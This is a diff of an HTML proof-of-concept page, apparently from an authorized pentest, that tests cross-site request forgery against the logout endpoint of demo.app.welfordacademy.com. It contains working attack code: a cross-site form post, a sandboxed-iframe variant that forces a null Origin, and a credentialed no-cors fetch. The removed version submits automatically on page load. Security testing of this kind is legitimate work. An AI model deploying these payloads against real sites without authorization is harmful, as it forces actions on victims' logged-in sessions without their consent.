@@ -1,11 +1,151 @@
 <!DOCTYPE html>
-<html>
-<body onload="document.forms[0].submit()">
-  <iframe sandbox="allow-forms allow-scripts" srcdoc="
-  <form id='f' action='https://demo.app.welfordacademy.com/api/auth/logout' method='POST' enctype='text/plain'>
-    <input type='hidden' name='{}' value=''>
-  </form>
-  <script>document.getElementById('f').submit()</script>
-"></iframe>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CSRF PoC — Welford IAG Pentest (Authorized)</title>
+<style>
+  body { font-family: -apple-system, Segoe UI, sans-serif; max-width: 720px; margin: 40px auto; padding: 0 20px; background:#0f1115; color:#e6e6e6; }
+  h1 { font-size: 20px; }
+  .note { background:#1c1f26; border-left:4px solid #d85a30; padding:12px 16px; margin:16px 0; font-size:14px; }
+  .test { background:#1a1d24; border:1px solid #2a2e37; border-radius:8px; padding:16px; margin:16px 0; }
+  .test h3 { margin-top:0; font-size:15px; }
+  button { background:#378ade; color:#fff; border:none; padding:8px 14px; border-radius:6px; cursor:pointer; font-size:13px; }
+  button:hover { background:#2a6fb8; }
+  pre { background:#0c0e12; padding:10px; border-radius:6px; overflow-x:auto; font-size:12px; white-space:pre-wrap; word-break:break-all; }
+  .status { font-weight:bold; }
+  .status.ok { color:#7fd88a; }
+  .status.blocked { color:#e2504a; }
+  .status.pending { color:#999; }
+</style>
+</head>
+<body>
+
+<h1>CSRF test — /api/auth/logout</h1>
+<div class="note">
+  Authorized test page for <code>demo.app.welfordacademy.com</code> pentest engagement. Hosted cross-origin on GitHub Pages so the browser sends real cross-site headers (Origin, Sec-Fetch-Site) instead of simulated ones. Only run this while logged into the target in this same browser.
+</div>
+
+<!-- TEST 1: plain cross-site form, normal enctype -->
+<div class="test">
+  <h3>Test 1 — plain cross-site form POST (baseline)</h3>
+  <p>Sends a real cross-site form submission. Browser will attach cookies automatically and send a real <code>Origin</code> header for this GitHub Pages domain.</p>
+  <button onclick="runTest1()">Run test 1</button>
+  <div id="status1" class="status pending">Not run yet</div>
+</div>
+
+<!-- TEST 2: sandboxed iframe forcing Origin: null -->
+<div class="test">
+  <h3>Test 2 — sandboxed iframe (forces Origin: null)</h3>
+  <p>Tests whether the server's origin allowlist has a gap for the <code>null</code> origin case, common with sandboxed iframes and some redirect flows.</p>
+  <button onclick="runTest2()">Run test 2</button>
+  <div id="status2" class="status pending">Not run yet</div>
+</div>
+
+<!-- TEST 3: fetch with credentials, read response via no-cors trick is not possible,
+     but we can still confirm the request FIRES even if we can't read the response -->
+<div class="test">
+  <h3>Test 3 — fetch() with credentials (fire-and-forget)</h3>
+  <p>Confirms whether the request is actually sent and processed server-side, even though CORS will block reading the JSON response. We check via a follow-up: reload target behavior manually after this fires.</p>
+  <button onclick="runTest3()">Run test 3</button>
+  <div id="status3" class="status pending">Not run yet</div>
+</div>
+
+<div class="test">
+  <h3>Result log</h3>
+  <pre id="log">Waiting for a test to run...</pre>
+</div>
+
+<script>
+const TARGET = "https://demo.app.welfordacademy.com/api/auth/logout";
+const log = (msg) => {
+  const el = document.getElementById('log');
+  el.textContent += "\n" + msg;
+};
+
+function setStatus(id, text, cls) {
+  const el = document.getElementById(id);
+  el.textContent = text;
+  el.className = "status " + cls;
+}
+
+// TEST 1 — plain form submission via hidden iframe target
+// (using a target iframe instead of top-level navigation so this page stays open
+//  and we can inspect what we can — note: cross-origin response body is NOT readable,
+//  this only proves the REQUEST fires with real browser-native cross-site headers)
+function runTest1() {
+  setStatus('status1', 'Sending...', 'pending');
+  log('--- Test 1: plain cross-site form POST ---');
+
+  const iframe = document.createElement('iframe');
+  iframe.name = 'sink1';
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+
+  const form = document.createElement('form');
+  form.action = TARGET;
+  form.method = 'POST';
+  form.enctype = 'text/plain';
+  form.target = 'sink1';
+
+  const input = document.createElement('input');
+  input.type = 'hidden';
+  input.name = '{}';
+  input.value = '';
+  form.appendChild(input);
+
+  document.body.appendChild(form);
+  form.submit();
+
+  log('Form submitted to ' + TARGET);
+  log('Browser sent real Origin header for this page\'s origin: ' + window.location.origin);
+  log('Cross-origin response body is not readable by JS (expected). Verify success by checking session state on the target app in another tab.');
+  setStatus('status1', 'Sent — verify manually on target app', 'ok');
+}
+
+// TEST 2 — sandboxed iframe forcing Origin: null
+function runTest2() {
+  setStatus('status2', 'Sending...', 'pending');
+  log('--- Test 2: sandboxed iframe, Origin: null ---');
+
+  const sandbox = document.createElement('iframe');
+  sandbox.sandbox = 'allow-forms allow-scripts';
+  sandbox.style.display = 'none';
+  sandbox.srcdoc = `
+    <form id="f" action="${TARGET}" method="POST" enctype="text/plain">
+      <input type="hidden" name='{}' value="">
+    </form>
+    <script>document.getElementById('f').submit();<\/script>
+  `;
+  document.body.appendChild(sandbox);
+
+  log('Sandboxed iframe injected — this forces the browser to send Origin: null');
+  log('Verify success by checking session state on the target app in another tab.');
+  setStatus('status2', 'Sent — verify manually on target app', 'ok');
+}
+
+// TEST 3 — fetch with credentials included, fire-and-forget
+async function runTest3() {
+  setStatus('status3', 'Sending...', 'pending');
+  log('--- Test 3: fetch() with credentials:include ---');
+  try {
+    // mode 'no-cors' lets the request FIRE cross-site even though we can't read the response.
+    // This mirrors what a real evil.com page would do with fetch() for a fire-and-forget CSRF.
+    await fetch(TARGET, {
+      method: 'POST',
+      credentials: 'include',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: '{}'
+    });
+    log('fetch() completed (no-cors mode — response body/status unreadable by design).');
+    log('This is exactly what a malicious page would run silently in the background.');
+    setStatus('status3', 'Sent — verify manually on target app', 'ok');
+  } catch (e) {
+    log('fetch() threw: ' + e.message);
+    setStatus('status3', 'Failed to send: ' + e.message, 'blocked');
+  }
+}
+</script>
+
 </body>
 </html>
